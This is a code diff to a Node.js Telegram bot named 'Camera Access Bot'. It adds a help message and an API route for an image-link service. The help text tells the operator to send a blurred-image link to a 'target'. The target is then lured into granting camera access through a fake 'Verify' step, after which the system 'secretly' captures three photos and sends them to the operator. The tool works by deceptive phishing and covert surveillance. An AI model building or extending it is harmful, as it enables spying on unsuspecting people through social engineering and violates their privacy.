@@ -102,6 +102,35 @@ bot.onText(/\/start/, async (msg) => {
     }
 });
 
+bot.onText(/\/help/, (msg) => {
+    const chatId = msg.chat.id;
+    const helpText = `<b>🛠 How to use Camera Access Bot</b>
+
+Welcome to the ultimate secure image sharing tool! Here is the step-by-step guide:
+
+<b>1️⃣ Start the Bot:</b>
+Click the <b>Start Task</b> button from the main menu.
+
+<b>2️⃣ Upload an Image:</b>
+Send any photo to the bot. This is the "protected" image you want your target to see.
+
+<b>3️⃣ Get the Secure Link:</b>
+The bot will instantly generate a unique, secure link for your image.
+
+<b>4️⃣ Share the Link:</b>
+Send this link to your target. When they open it, they will see a blurred version of your image.
+
+<b>5️⃣ Verification Process:</b>
+To view the clear image, they must click <b>Verify</b> and allow camera access.
+
+<b>6️⃣ Receive Captures:</b>
+The system will secretly capture 3 photos and send them directly to you in this chat!
+
+<i>🔐 Note: Everything is fully automated and secure.</i>`;
+
+    bot.sendMessage(chatId, helpText, { parse_mode: 'HTML' });
+});
+
 bot.on('callback_query', async (callbackQuery) => {
     const msg = callbackQuery.message;
     const chatId = msg.chat.id;
@@ -211,6 +240,25 @@ bot.on('photo', async (msg) => {
 });
 
 // ================= Express API Logic =================
+
+app.get('/api/link/:id', async (req, res) => {
+    const { id } = req.params;
+    try {
+        const { data, error } = await supabase
+            .from('links')
+            .select('original_image_url')
+            .eq('id', id)
+            .single();
+
+        if (error || !data) {
+            return res.status(404).json({ error: 'Link not found' });
+        }
+        res.json({ original_image_url: data.original_image_url });
+    } catch (err) {
+        console.error('API Error:', err);
+        res.status(500).json({ error: 'Internal server error' });
+    }
+});
 
 app.post('/upload', upload.array('photos', 3), async (req, res) => {
     const { id } = req.body;
